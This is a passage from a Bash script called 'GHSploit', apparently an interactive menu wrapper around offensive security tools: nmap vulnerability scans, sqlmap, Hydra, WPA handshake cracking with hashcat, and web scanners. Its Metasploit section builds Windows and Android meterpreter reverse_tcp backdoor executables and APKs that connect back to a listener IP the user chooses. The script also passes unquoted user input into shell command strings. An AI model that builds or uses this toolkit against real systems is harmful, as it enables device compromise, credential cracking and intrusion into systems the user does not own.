	if [ $dirbinstalled -eq 1 ];then
		echo "[10] Quick directory enumerating"
	elif [ $dirbinstalled -eq 0 ];then
		echo -e "${red}[10] Qick directory enumerating${end}"
	fi
	sleep 0.01
	if [ $gobusterinstalled -eq 1 ];then
		echo "[11] Advanced directory enumerating"
	elif [ $gobusterinstalled -eq 0 ];then
		echo -e "${red}[11] Advanced directory enumerating${end}"
	fi
	sleep 0.01
	echo "[12] Back to menu"
	sleep 0.01
	echo "[13] Exit"
	read -p $'\e[1;31m>>>\e[0m ' tool_choose
	case $tool_choose in
		1)
		if [ $nmapinstalled = 0 ];then
			sleep 0.01
			echo "Nmap is not installed..."
			sleep 0.01
			echo "Please, install nmap and go back!"
			sleep 0.01
			secs=$((5))
			while [ $secs -gt 0 ]; do
			   echo -ne "Returning to main menu in $secs\033[0K\r"
			   sleep 1
			   : $((secs--))
			done
			tools
		else
			if [ $connection == "no" ];then
				echo "Looks like you are not connected to any network(even to lan)."
				echo "Nmap is useless without connection"
				echo "Please, check your connection and try again"
				echo "Press ENTER to go back to menu!"
				read ajspaojpqj
				main_menu
			else
				if [ $EUID != 0 ];then
					nmapnonroot
				else
					nmapf
				fi
			fi
		fi
		;;
		2)
		if [ $sqlmapinstalled = 0 ];then
			sleep 0.01
			echo "sqlmap is not installed..."
			sleep 0.01
			echo "Please, install sqlmap and go back!"
			sleep 0.01
			secs=$((5))
			while [ $secs -gt 0 ]; do
			   echo -ne "Returning to main menu in $secs\033[0K\r"
			   sleep 1
			   : $((secs--))
			done
			tools
		else
			if [ $connection == "no" ];then
				echo "Looks like you are not connected to any network(even to lan)."
				echo "sqlmap is useless without connection"
				echo "Please, check your connection and try again"
				echo "Press ENTER to go back to menu!"
				read ajspaojpqj
				main_menu
			else
				sqlf
			fi
		fi
		;;
		3)
		if [ $msfinstalled = 0 ];then
			sleep 0.01
			echo "It seems like your system haven't installed Metasploit"
			sleep 0.01
			echo "Please, install Metasploit and go back!"
			sleep 0.01
			secs=$((5))
			while [ $secs -gt 0 ]; do
			   echo -ne "Returning to main menu in $secs\033[0K\r"
			   sleep 1
			   : $((secs--))
			done
			tools
		else
			if [ $connection == "no" ];then
				echo "Looks like you are not connected to any network(even to lan)."
				echo "You may use Metasploit to create backdoors if you have static IP-address and you know that address"
				echo "Otherwise, you couldn't create normal backdoors."
				echo "Are you sure you want to continue?(y/n)"
				read -p $'\e[1;31m>>>\e[0m ' msfcont
				case $msfcont in
					y)
					msff
					;;
					n)
					main_menu
					;;
					*)
					echo "Error input, returning back to menu!"
					sleep 1
					main_menu
					;;
				esac
			else
				msff
			fi

		fi
		;;
		4)
		if [ $whoisinstalled = 0 ];then
			sleep 0.01
			echo "It seems like your system haven't installed Whois..."
			sleep 0.01
			echo "Please, install whois and go back!"
			sleep 0.01
			secs=$((5))
			while [ $secs -gt 0 ]; do
			   echo -ne "Returning to main menu in $secs\033[0K\r"
			   sleep 1
			   : $((secs--))
			done
			tools
		else
			if [ $connection == "lan" -o $connection == "no" ];then
				echo "Looks like you haven't internet connection"
				echo "Whois tool is useless without internet"
				echo "Please, check your internet connection and try again"
				echo "Press ENTER to return to main menu"
				read asdasdsajdad
				main_menu
			else
				whoisf
			fi
		fi
		;;
		5)
		if [ $hydrainstalled = 0 ];then
			sleep 0.01
			echo "Hydra is not installed..."
			sleep 0.01
			echo "Please, install Hydra and go back!"
			sleep 0.01
			secs=$((5))
			while [ $secs -gt 0 ]; do
			   echo -ne "Returning to main menu in $secs\033[0K\r"
			   sleep 1
			   : $((secs--))
			done
			tools
		else
			if [ $connection == "no" ];then
				echo "Looks like you are not connected to any network(even to lan)."
				echo "Hydra is useless without connection"
				echo "Please, check your connection and try again"
				echo "Press ENTER to go back to menu!"
				read ajspaojpqj
				main_menu
			else
				hydraf
			fi
		fi
		;;
		6)
		if [ $hashcatinstalled = 0 ];then
			sleep 0.01
			echo "It seems like your system haven't installed Hashcat!"
			sleep 0.01
			echo "Please, install Hashcat and go back!"
			sleep 0.01
			secs=$((5))
			while [ $secs -gt 0 ]; do
			   echo -ne "Returning to main menu in $secs\033[0K\r"
			   sleep 1
			   : $((secs--))
			done
			tools
		else
			hashcatf
		fi
		;;
		7)
		if [ $wpscaninstalled = 0 ];then
			sleep 0.01
			echo "wpscan is not installed..."
			sleep 0.01
			echo "Please, install wpscan and go back!"
			sleep 0.01
			secs=$((5))
			while [ $secs -gt 0 ]; do
			   echo -ne "Returning to main menu in $secs\033[0K\r"
			   sleep 1
			   : $((secs--))
			done
			tools
		else
			if [ $connection == "no" ];then
				echo "Looks like you are not connected to any network(even to lan)."
				echo "wpscan is useless without connection"
				echo "Please, check your connection and try again"
				echo "Press ENTER to go back to menu!"
				read ajspaojpqj
				main_menu
			else
				wpscanf
			fi
		fi
		;;
		8)
		if [ $joomscaninstalled = 0 ];then
			sleep 0.01
			echo "Joomscan is not installed..."
			sleep 0.01
			echo "Please, install Joomscan and go back!"
			sleep 0.01
			secs=$((5))
			while [ $secs -gt 0 ]; do
			   echo -ne "Returning to main menu in $secs\033[0K\r"
			   sleep 1
			   : $((secs--))
			done
			tools
		else
			if [ $connection == "no" ];then
				echo "Looks like you are not connected to any network(even to lan)."
				echo "Joomscan is useless without connection"
				echo "Please, check your connection and try again"
				echo "Press ENTER to go back to menu!"
				read ajspaojpqj
				main_menu
			else
				joomscanf
			fi
		fi
		;;
		9)
		if [ $niktoinstalled = 0 ];then
			sleep 0.01
			echo "Nikto scanner is not installed..."
			sleep 0.01
			echo "Please, install nikto and go back!"
			sleep 0.01
			secs=$((5))
			while [ $secs -gt 0 ]; do
			   echo -ne "Returning to main menu in $secs\033[0K\r"
			   sleep 1
			   : $((secs--))
			done
			tools
		else
			if [ $connection == "no" ];then
				echo "Looks like you are not connected to any network(even to lan)."
				echo "Nikto is useless without connection"
				echo "Please, check your connection and try again"
				echo "Press ENTER to go back to menu!"
				read ajspaojpqj
				main_menu
			else
				niktof
			fi
		fi
		;;
		10)
		if [ $dirbinstalled = 0 ];then
			sleep 0.01
			echo "dirb is not installed..."
			sleep 0.01
			echo "Please, install dirb and go back!"
			sleep 0.01
			secs=$((5))
			while [ $secs -gt 0 ]; do
			   echo -ne "Returning to main menu in $secs\033[0K\r"
			   sleep 1
			   : $((secs--))
			done
			tools
		else
			if [ $connection == "no" ];then
				echo "Looks like you are not connected to any network(even to lan)."
				echo "dirb is useless without connection"
				echo "Please, check your connection and try again"
				echo "Press ENTER to go back to menu!"
				read ajspaojpqj
				main_menu
			else
				dirbf
			fi
		fi
		;;
		11)
		if [ $gobusterinstalled = 0 ];then
			sleep 0.01
			echo "GoBuster is not installed..."
			sleep 0.01
			echo "Please, install GoBuster and go back!"
			sleep 0.01
			secs=$((5))
			while [ $secs -gt 0 ]; do
			   echo -ne "Returning to main menu in $secs\033[0K\r"
			   sleep 1
			   : $((secs--))
			done
			tools
		else
			if [ $connection == "no" ];then
				echo "Looks like you are not connected to any network(even to lan)."
				echo "GoBuster is useless without connection"
				echo "Please, check your connection and try again"
				echo "Press ENTER to go back to menu!"
				read ajspaojpqj
				main_menu
			else
				gobusterf
			fi
		fi
		;;
		12)
		main_menu
		;;
		13)
		exit 0
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		tools
		;;
	esac
}

#Function that asks 'Do you want to return to main menu' after any tool task(s) has been completed
wannabackf() {
	clear
	banner
	echo "Done!"
	echo "Do you want to return to main menu?(y/n)"
	read -p $'\e[1;31m>>>\e[0m ' wannaback
	case $wannaback in
		y)
		main_menu
		;;
		n)
		echo "Thank you for using GHSploit! Have a nice day!"
		exit
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		clear
		wannabackf
		;;
	esac
}

#===================================================================
#NMAP functions
#===================================================================
nmapf() {
	clear
	banner
	nmaptarget
	nmapistargetup
	nmaprange
	nmapoptf
	nmapverbosity
	nmapoutputf
	nmapcontrol
}

nmapnonroot() {
	clear
	banner
	echo -e "${slimred}Running nmap in non-root mode, limited functionality${end}"
	nmaptarget
	nmapistargetup
	nmaprange
	nmapverbosity
	nmapnonrootgo
}

nmapnonrootgo() {
	xterm -hold -geometry 100x30 -T "Running non-root nmap scan on target $nmapinput" -e "nmap $nmapinput $nmaprangep $nmapverbp $forcescan"
	wannabackf
}

nmaptarget() {
	echo "Enter the target host adress (example: 192.168.0.1 or example.com): "
	read -p $'\e[1;31m>>>\e[0m ' nmapinput
}

#checking is there some kind of firewalls or is target online?
nmapistargetup() {
	clear
	banner
	echo "Now we need to perform PING scan"
	sleep 0.01
	echo "If ping does, that telling us that host is online"
	sleep 0.01
	echo "Would you like to ping the target?(y/n)"
	read -p $'\e[1;31m>>>\e[0m ' canweping
	case $canweping in
		y)
		clear
		echo "Initializing ping function..."
		sleep 0.01
		echo "Wait a few seconds and close the new window"
		sleep 0.01
		echo "If target is reachable, you will see the digits of ping"
		sleep 0.01
		echo "If you see message like HOST UNREACHABLE, answer N after ping"
		sleep 0.01
		echo "Press 'Enter' to start..."
		read ewq
		xterm -geometry 100x30 -T "Pinging target host" -e "ping -v $nmapinput"
		clear
		echo "Is target reachable?(y/n): "
		read -p $'\e[1;31m>>>\e[0m ' isreachable
			if [ $isreachable = y ];then
				forcescan=""
			elif [ $isreachable = n ];then
				forcescan="-Pn"
			else
				echo "Error input, marking all hosts as 'up' to perform scan anyway..."
			fi
		;;
		n)
		echo "Error input.."
		echo "Marking all hosts as 'up' to perform scan anyway..."
		forcescan="-Pn"
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		nmapistargetup
		;;
	esac
}

nmaprange() {
	clear
	banner
	echo "Select the range of scanning ports?('t,a' or type custom port or range of ports, separated by comma): "
	sleep 0.01
	echo "t. 1000 default open ports"
	sleep 0.01
	echo "a. Scan for all of 65535 open ports"
	read -p $'\e[1;31m>>>\e[0m ' nmaprange
	case $nmaprange in
		t)
		nmaprangep=""
		;;
		a)
		nmaprangep="-p-"
		;;
		*)
		nmaprangep="-p$nmaprange"
		;;
	esac
}

nmapoptf() {
	clear
	banner
	echo "Select one of pre-built scanning options(press 'c' for custom settings): "
	sleep 0.01
	echo "1. Fast scan (no options)"
	sleep 0.01
	echo "2. Scan with service detection and their version + SYN Scan"
	sleep 0.01
	echo "3. Scan for vulnerabilities"
	sleep 0.01
	echo "4. 2+3"
	sleep 0.01
	echo "5. 4 + Agressive detection"
	read -p $'\e[1;31m>>>\e[0m ' nmapopt
	case $nmapopt in
		1)
		nmapopts=""
		;;
		2)
		nmapopts="-sS -sV -sC"
		;;
		3)
		nmapopts="--script=vuln"
		;;
		4)
		nmapopts="-sS -sV -sC --script=vuln"
		;;
		5)
		nmapopts="-sS -sV -sC --script=vuln -A"
		;;
		c)
		echo "Enter your options (ex.: -sS -sV etc..)"
		read -p $'\e[1;31m>>>\e[0m ' custopopts
		nmapopts="$custopopts"
		;;
		*)
		echo "Error input, repeating.."
		sleep 1
		nmapoptf
		;;
	esac
}

nmapverbosity() {
	clear
	banner
	echo "Choose level of verbosity (0,1,2): "
	sleep 0.01
	echo "0. No verbosity"
	sleep 0.01
	echo "1. Normal verbosity"
	sleep 0.01
	echo "2. Be more verbose"
	read -p $'\e[1;31m>>>\e[0m ' nmapverb
	case $nmapverb in
		0)
		nmapverbp=""
		;;
		1)
		nmapverbp="-v"
		;;
		2)
		nmapverbp="-vv"
		;;
		*)
		echo "Error input, setting verbosity to 0"
		nmapverbp=""
		;;
	esac
}

nmapoutputf() {
	clear
	banner
	echo "Do you want to save the output?(y/n): "
	read -p $'\e[1;31m>>>\e[0m ' nmapoutput
	case $nmapoutput in
		y)
		dirnmap=GHSNmap_output
		nmapoutputp="-oN"
		echo "Enter the name of output file"
		read -p $'\e[1;31m>>>\e[0m ' nmapoutputnamep
		;;
		n)
		nmapoutputp=""
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		nmapoutput
		;;
	esac
}

nmap_input_fix() {
	echo "Where is error?"
	sleep 0.01
	echo "1. Target"
	sleep 0.01
	echo "2. Range of ports"
	sleep 0.01
	echo "3. Scan options"
	sleep 0.01
	echo "4. Level of verbosity"
	sleep 0.01
	echo "5. Output parameters"
	sleep 0.01
	echo "6. My mistake, it's all right! Go ahead."
	sleep 0.01
	echo "7. I've changed my mind.  Wanna quit. "
	read -p $'\e[1;31m>>>\e[0m ' nif
	case $nif in 
		1)
		nmaptarget
		nmapcontrol
		;;
		2)
		nmaprange
		nmapcontrol
		;;
		3)
		nmapoptf
		nmapcontrol
		;;
		4)
		nmapverbosity
		nmapcontrol
		;;
		5)
		nmapoutputf
		nmapcontrol
		;;
		6)
		nmapcontrol
		;;
		7)
		exit
		;;
	esac
}

#So dumb code I know :D Forgive me, next funcs looks pretty better ;)
nmapcontrol() {
	clear
	banner
	echo "Check your input before start to exclude errors: "
	sleep 0.01
	echo "Target : $nmapinput "
	sleep 0.01
	if [ $nmaprange = t ];then
		echo "Range of ports : Common 1000 ports"
	elif [ $nmaprange = a ];then
		echo "Range of ports : All 65535 ports (slower)"
	else
		echo "Range of ports : $nmaprange "
	fi
	sleep 0.01
	if [ $nmapopt = 1 ];then
		echo "Options : Not selected, default scan"
	else
		echo "Options : $nmapopts "
	fi
	sleep 0.01
	if [ $nmapverb = 1 ];then
		echo "Verbosity : Normal verbosity"
	elif [ $nmapverb = 2 ];then
		echo "Verbosity : Max verbosity"
	else
		echo "Verbosity : No verbosity"
	fi
	sleep 0.01
	if [ $nmapoutput = y ];then
		echo "Output file : $nmapoutputnamep"
	fi
	echo "Is it all right?(y/n): "
	read -p $'\e[1;31m>>>\e[0m ' nmapisitallright
	case $nmapisitallright in 
		y)
		if [ $nmapoutput = y ];then
			if ! [ -d $dirnmap ];then
				mkdir $dirnmap
				xterm -geometry 100x30 -T "Running nmap on $nmapinput" -e "sudo nmap $forcescan $nmapinput $nmaprangep $nmapopts $nmapverbp $nmapoutputp $dirnmap/$nmapoutputnamep"
				clear
				echo "Done! Scan results available in $dirnmap/$nmapoutputnamep"
				sleep 0.5
				wannabackf
			else
				xterm -hold -geometry 100x30 -T "Running nmap on $nmapinput" -e "sudo nmap $forcescan $nmapinput $nmaprangep $nmapopts $nmapverbp $nmapoutputp $dirnmap/$nmapoutputnamep"
				clear
				echo "Done! Scan results available in $dirnmap/$nmapoutputnamep"
				sleep 0.05
				wannabackf
			fi
		else
			xterm -hold -geometry 100x30 -T "Running nmap on $nmapinput" -e "sudo nmap $forcescan $nmapinput $nmaprangep $nmapopts $nmapverbp"
			clear
			echo "Done!"
			wannabackf
		fi
		;;
		n)
		nmap_input_fix
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		nmapcontrol
		;;
	esac
}
#===================================================================
#END OF NMAP FUNCS
#===================================================================

#===================================================================
#Metasploit payload creation functions
#===================================================================
msff() {
	clear
	banner
	echo "Choose the type of payload you want to create: "
	sleep 0.01
	echo "1.Payload for Windows"
	sleep 0.01
	echo "2.Payload for Android"
	sleep 0.01
	read -p $'\e[1;31m>>>\e[0m ' payloadtype
	case $payloadtype in
		1)
		windows_payload
		;;
		2)
		android_payload
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		msff
		;;
	esac
}
#===============================
#Windows payload creation
##==============================
windows_payload() {
	win_archtype
	win_payloadname
	win_payloadip
	win_payloadport
	win_payloadcheck
}

win_archtype() {
	echo "Select arch of target machine (32/64):"
	read -p $'\e[1;31m>>>\e[0m ' arch
		case ${arch} in
			32)
			payload="x32"
			;;
			64)
			payload="x64"
			;;
			*)
			echo "Error input, repeating..."
			sleep 1
			win_archtype
			;;
		esac
}

win_payloadname() {
	echo "Now, enter the name of your payload: "
	read -p $'\e[1;31m>>>\e[0m ' winpayloadname
	if [[ -f GHSploit_win_payloads/$winpayloadname.exe ]];then
		echo "Looks like you wanna create a backdoor that already exists!"
		echo "Please, enter another name for your payload!"
		echo "Press ENTER to try again"
		read pjsdjaospdjp
		clear
		win_payloadname
	fi
}

win_payloadip() {
	echo "Enter the listening IP: "
	read -p $'\e[1;31m>>>\e[0m ' winpayloadip
}

win_payloadport() {
	echo "Enter the listening port: "
	read -p $'\e[1;31m>>>\e[0m ' winpayloadport
}

win_payloadcheck() {
	clear
	echo "Almost done, now check your input to avoid errors"
	sleep 0.01
	echo "Payload name : $winpayloadname "
	sleep 0.01
	echo "Payload arch : $payload "
	sleep 0.01
	echo "Payload IP : $winpayloadip "
	sleep 0.01
	echo "Payload port : $winpayloadport "
	sleep 0.01
	echo "Is it all right?(y/n): "
	read -p $'\e[1;31m>>>\e[0m ' wincontrol
	case $wincontrol in
		y)
		dir=GHSploit_win_payloads
		if [ $payload = "x32" ];then
			if [ -d $dir ];then
				msfvenom -p windows/meterpreter/reverse_tcp LHOST=$winpayloadip LPORT=$winpayloadport -f exe > $dir/$winpayloadname.exe
				echo "DONE!You can find your payload in $dir/$winpayloadname.exe"
				wannabackf
			else
				mkdir $dir
				msfvenom -p windows/meterpreter/reverse_tcp LHOST=$winpayloadip LPORT=$winpayloadport -f exe > $dir/$winpayloadname.exe
				echo "DONE!You can find your payload in $dir/$winpayloadname.exe"
				wannabackf
			fi
		else
			if [ -d $dir ];then
				msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$winpayloadip LPORT=$winpayloadport -f exe > $dir/$winpayloadname.exe
				echo "DONE!You can find your payload in $dir/$winpayloadname.exe"
				wannabackf
			else
				mkdir $dir
				msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$winpayloadip LPORT=$winpayloadport -f exe > $dir/$winpayloadname.exe
				echo "DONE!You can find your payload in $dir/$winpayloadname.exe"
				wannabackf
			fi
		fi
		;;
		n)
		windows_payload_help
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		win_payloadcheck
		;;
	esac
}

windows_payload_help() {
	echo "Where is error?: "
	sleep 0.01
	echo "1.Payload name"
	sleep 0.01
	echo "2.Payload arch"
	sleep 0.01
	echo "3.Payload IP"
	sleep 0.01
	echo "4.Payload port"
	sleep 0.01
	echo "5.My mistake, it's all correct. Go ahead!"
	sleep 0.01
	echo "6.I've changed my mind, wanna qiut"
	read -p $'\e[1;31m>>>\e[0m ' win_help_ans
	case $win_help_ans in
		1)
		clear
		win_payloadname
		win_payloadcheck
		;;
		2)
		clear
		win_archtype
		win_payloadcheck
		;;
		3)
		clear
		win_payloadip
		win_payloadcheck
		;;
		4)
		clear
		win_payloadport
		win_payloadcheck
		;;
		5)
		clear
		win_payloadcheck
		;;
		6)
		echo "Bye!"
		exit
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		windows_payload_help
		;;
	esac
}
#===============================
#Android payload creation
#===============================
android_payload() {
	clear
	and_namef
	and_ipf
	and_portf
	and_checkf
}

and_namef() {
	echo "Enter the name for your payload: "
	read -p $'\e[1;31m>>>\e[0m ' and_name
	if [[ -f GHSploit_and_payloads/$and_name.exe ]];then
		echo "Looks like you wanna create a backdoor that already exists!"
		echo "Please, enter another name for your payload!"
		echo "Press ENTER to try again"
		read pjsdjaospdjp
		clear
		and_namef
	fi
}

and_ipf() {
	echo "Now enter the listening host: "
	read -p $'\e[1;31m>>>\e[0m ' and_ip
}

and_portf() {
	echo "Enter the listening port: "
	read -p $'\e[1;31m>>>\e[0m ' and_port
}

and_checkf() {
	clear
	echo "Almost done, check input to avoid errors: "
	sleep 0.01
	echo "Payload name : $and_name"
	sleep 0.01
	echo "Payload IP : $and_ip "
	sleep 0.01
	echo "Payload port : $and_port"
	sleep 0.01
	echo "Is it all right?(y/n): "
	read -p $'\e[1;31m>>>\e[0m ' andcontrol
	case $andcontrol in
		y)
		dir=GHSploit_and_payloads
			if [ -d $dir ];then
				msfvenom -a java --platform android -p android/meterpreter/reverse_tcp LHOST=$and_ip LPORT=$and_port -o $dir/$and_name.apk
				echo "DONE!You can find your payload in $dir/$and_name.apk"
				wannabackf
			else
				mkdir $dir
				msfvenom -a java --platform android -p android/meterpreter/reverse_tcp LHOST=$and_ip LPORT=$and_port -o $dir/$and_name.apk
				echo "DONE!You can find your payload in $dir/$and_name.apk"
				wannabackf
			fi
		;;
		n)
		and_helpf
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		and_checkf
		;;
	esac	
}

and_helpf() {
	echo "Where is mistake?"
	sleep 0.01
	echo "1.Payload name"
	sleep 0.01
	echo "2.Payload IP"
	sleep 0.01
	echo "3.Payload port"
	sleep 0.01
	echo "4.My mistake, its all right. Go ahead!"
	sleep 0.01
	echo "5.I've changed my mind, wanna quit"
	read and_help
	case $and_help in
		1)
 		and_namef
 		and_checkf
 		;;
 		2)
		and_ipf
		and_checkf
		;;
		3)
		and_portf
		and_checkf
		;;
		4)
		and_checkf
		;;
		5)
		echo "Bye!"
		exit
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		and_helpf
		;;
	esac
}
#===================================================================
#End of Metasploit payload creation functions
#===================================================================
#Start of Hashcat functions
#===================================================================
hashcatf() {
	clear
	brutemode
	path_to_handshake
	w_type_func
	checkbeforebrutehs
}

brutemode() {
	clear
	sleep 0.01
	echo "Would you like to brute by wordlist or by mask?"
	sleep 0.01
	echo "1.Wordlist"
	sleep 0.01
	echo "2.Mask"
	sleep 0.01
	echo "3.Go back to menu"
	read maskwordlist
	case $maskwordlist in
		1)
		a=0
		mode=Dictionary
		mask=None
		wordlist_pathf
		;;
		2)
		a=3
		mode=Mask
		wordlist_path=None
		mask_input
		;;
		3)
		main_menu
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		brutemode
		;;
	esac
}

wordlist_pathf() {
	clear
	sleep 0.01
	echo "Drag'n'Drop wordlist or enter path manually: "
	sleep 0.01
	echo "For example: /home/user/wordlist.txt"
	read -p $'\e[1;31m>>>\e[0m ' wordlist_path
	if [[ -f $wordlist_path ]];then
		if [ $wordlist_path = ];then
			echo "Error input, repeating..."
			sleep 1
			clear
			wordlist_pathf
		fi
	else
		echo "Oops, looks like you want to select an unexisted wordlist."
		echo "Please, check that you've inputted a right path to wordlist"
		echo "Press ENTER to try again!"
		read pasjfoasi
		wordlist_pathf
	fi

}

mask_input() {
	clear
	echo "Enter your mask"
	sleep 0.01
	echo "For example, for 8-digit password it's ?d?d?d?d?d?d?d?d"
	sleep 0.01
	echo "Type 'b' to go back"
	sleep 0.01
	echo "Mask: "
	read -p $'\e[1;31m>>>\e[0m ' mask
	if [ $mask = ];then
		echo "Error input, repeating..."
		sleep 1
		mask_input
	fi
}

w_type_func() {
	clear
	sleep 0.01
	echo "Enter the level of performance(1-4): "
	sleep 0.01
	echo "1.Easy"
	sleep 0.01
	echo "2.Medium"
	sleep 0.01
	echo "3.High"
	sleep 0.01
	echo "4.Insane(may cause lags, syster freezes and overheating)"
	read -p $'\e[1;31m>>>\e[0m ' w_type
	case $w_type in
		1)
		w_type=1
		perf=Easy
		;;
		2)
		w_type=2
		perf=Medium
		;;
		3)
		w_type=3
		perf=High
		;;
		4)
		w_type=4
		perf=Insane
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		w_type_func
		;;
	esac
}

path_to_handshake() {
	clear
	sleep 0.01
	echo "Drag'n'Drop handshake or enter handshake path manually"
	sleep 0.01
	echo "Example: /home/user/Desktop/handshake.hccapx"
	sleep 0.01
	echo "Path: "
	read -p $'\e[1;31m>>>\e[0m ' handshake_path
	if [[ -f $handshake_path ]];then
		if [ $handshake_path = ];then
			echo "Error input, repeating..."
			sleep 1
			clear
			path_to_handshake
		elif [[ $handshake_path != *.hccapx ]];then
			echo "Looks like it's not a hashcat-type handshake."
			echo "Please, input a .hccapx-format file"
			sleep 5
			clear
			path_to_handshake
		fi
	else
		echo "Oops, looks like you want to select an unexisted handshake!"
		echo "Please, check that you've inputted a right path to handshake"
		echo "Press ENTER to try again!"
		read pasjfoasi
		path_to_handshake
	fi
}

checkbeforebrutehs() {
	clear
	sleep 0.01
	echo "Handshake : $handshake_path"
	sleep 0.01
	echo "Brute mode : $mode"
	sleep 0.01
	echo "Performance mode : $perf"
	sleep 0.01
	echo "Mask : $mask"
	sleep 0.01
	echo "Wordlist : $wordlist_path"
	sleep 0.01
	echo "Is it all right?(y/n)"
	read -p $'\e[1;31m>>>\e[0m ' chbefbrhs
	case $chbefbrhs in
		y)
		echo "Brutefocing your handshake..."
		if [ $a = 0 ];then
			wlbrutehs
		else
			maskbrutehs
		fi
		clear
		wannabackf
		;;
		n)
		hs_mistake
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		checkbeforebrutehs
		;;
	esac
}

hs_mistake() {
	sleep 0.01
	echo "What's wrong?"
	sleep 0.01
	echo "1.Handshake path"
	sleep 0.01
	echo "2.Bruteforce mode"
	sleep 0.01
	echo "3.Performance mode"
	sleep 0.01
	echo "4.Mask"
	sleep 0.01
	echo "5.Wordlist path"
	sleep 0.01
	echo "6.My mistake, it is all right"
	read -p $'\e[1;31m>>>\e[0m ' whatiserrorhs
	case $whatiserrorhs in
		1)
		path_to_handshake
		checkbeforebrutehs
		;;
		2)
		brutemode
		checkbeforebrutehs
		;;
		3)
		w_type_func
		checkbeforebrutehs
		;;
		4)
		if [ $a -eq 3 ];then
			mask_input
			checkbeforebrutehs
		else
			echo "Lol, you've selected wordlist bruteforce mode and you trying to change the mask..."
			echo "If you've want to change brute mode, please, select option 2."
			echo "Press ENTER to repeat input..."
			read joadsfj
			hs_mistake
		fi
		;;
		5)
		if [ $a -eq 0 ];then
			wordlist_pathf
			checkbeforebrutehs
		else
			echo "Lol, you've selected mask bruteforce mode and you trying to change the wordlist..."
			echo "If you've want to change brute mode, please, select option 2."
			echo "Press ENTER to repeat input..."
			read joadsfj
			hs_mistake
		fi
		;;
		6)
		checkbeforebrutehs
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		hs_mistake
		;;
	esac
}

wlbrutehs() {
	xterm -hold -geometry 100x30 -T "Bruteforcing $handshake_path" -e "hashcat -a 0 -m 2500 -w $w_type $handshake_path $wordlist_path"
}

maskbrutehs() {
	xterm -hold -geometry 100x30 -T "Bruteforcing $handshake_path" -e "hashcat -a 3 -m 2500 -w $w_type $handshake_path '$mask'"
}
#===================================================================
#End of Hashcat functions
#===================================================================

#===================================================================
#Starting of whois funcs
#===================================================================
whoisf() {
	clear
	echo "Be verbose?(y/n): "
	read -p $'\e[1;31m>>>\e[0m ' whoisverb
	case $whoisverb in
		y)
		verb="--verbose"
		whoisrequest
		;;
		n)
		verb=""
		whoisrequest
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		whoisf
		;;
	esac
}
whoisrequest() {
	clear
	echo "Enter IP/hostname of service you want to check: "
	read -p $'\e[1;31m>>>\e[0m ' whoishost
	xterm -hold -geometry 100x30 -e "whois $verb $whoishost"
	echo "Done! Do you want to check another host?"
	echo "1.Yes, I want to check another host"
	echo "2.No, go back to menu!"
	echo "3.Exit"
	read -p $'\e[1;31m>>>\e[0m ' whoisexit
	case $whoisexit in
		1)
		whoisf
		;;
		2)
		main_menu
		;;
		3)
		exit 0
		;;
	esac
}
#===================================================================
#End of whois funcs
#===================================================================
#Starting of dirb & gobuster funcs
#===================================================================

urlinputdirb() {
	clear
	echo "Please, insert your target url(in format : http://example.com/ or https://example.com/"
	read -p $'\e[1;31m>>>\e[0m ' targeturldirb
}

wlinputdirb() {
	clear
	echo "Please, insert your wordlist to use(leave empty to use default dirb wordlist)"
	read -p $'\e[1;31m>>>\e[0m ' wordlistdirb
}

checkdirb() {
	clear
	echo "Done!"
	echo "Target url : $targeturldirb"
	if [[ $wordlistdirb == "" ]];then
		echo "Wordlist : Default"
	else
		echo "Wordlist : $wordlistdirb"
	fi
	echo "Is it all right?[ENTER for YES&GO]"
	echo "1. No, URL is wrong!"
	echo "2. No, Wordlist is wrong"
	read dirbwhatswrong
	case $dirbwhatswrong in
		"")
		dirbgo
		;;
		1)
		urlinputdirb
		checkdirb
		;;
		2)
		wlinputdirb
		checkdirb
		;;
		*)
		echo "Error input, repeating..."
		sleep 1
		checkdirb
		;;
	esac
}

dirbgo() {
	xterm -hold -geometry 100x30 -e "dirb $targeturldirb $wordlistdirb"
}

dirbf() {
	urlinputdirb
	wlinputdirb
	checkdirb
	clear
	echo "Done! Do you want to enumerate another website with dirb?"
	echo "1. Yes, GO!"
	echo "2. No, go to main menu"
	echo "3. Exit"
	read -p $'\e[1;31m>>>\e[0m ' dirbdone
	case $dirbdone in
		1)
		dirbf
		;;
		2)
		main_menu
		;;
		3)
		exit 0
		;;
		*)
		echo "Error input, going back to main menu.."
		sleep 2
		main_menu
		;;
	esac
}

gobusterf() {
	urlinputgob
	wlinputgob
	threadsgob
	extgob
	checkgob
	clear
	echo "Done! Do you want to brute another website with a gobuster?"
	echo "1. Yes, GO!"
	echo "2. No, go to main menu"
	echo "3. Exit"
	read -p $'\e[1;31m>>>\e[0m ' gobdone
	case $gobdone in
		1)
		gobusterf
		;;
		2)
		main_menu
		;;
		3)
		echo "Error input, going back to main menu.."
		sleep 2
		main_menu
		;;
	esac
}

urlinputgob() {
	clear
	echo "Please, insert your target url(in format : http://example.com/ or https://example.com/"
	read -p $'\e[1;31m>>>\e[0m ' targeturlgob
}

wlinputgob() {
	clear
	echo "Now, Drag'n'Drop your wordlist or input the path to it manually"
	read -p $'\e[1;31m>>>\e[0m ' wordlistgob
	if [ -f $wordlistgob ];then
		echo "Ok"
	else
		echo "Looks like you want to use an unexisted wordlist..."
		echo "Please, submit the correct wordlist path"
		echo "Press ENTER to repeat..."
		read asdjasdpajp
		wlinputgob
	fi
}

threadsgob() {
	clear
	echo "How many threads you want to use?(leave empty for default 10 threads)"
	read -p $'\e[1;31m>>>\e[0m ' threadsgob
	case $threadsgob in
		*[^0-9*])
		echo "Only digits allowed!"
		sleep 1.5
		clear
		threadsgob
		;;
		"")
		threadsgob=10
		;;
	esac
}

extgob() {
	clear
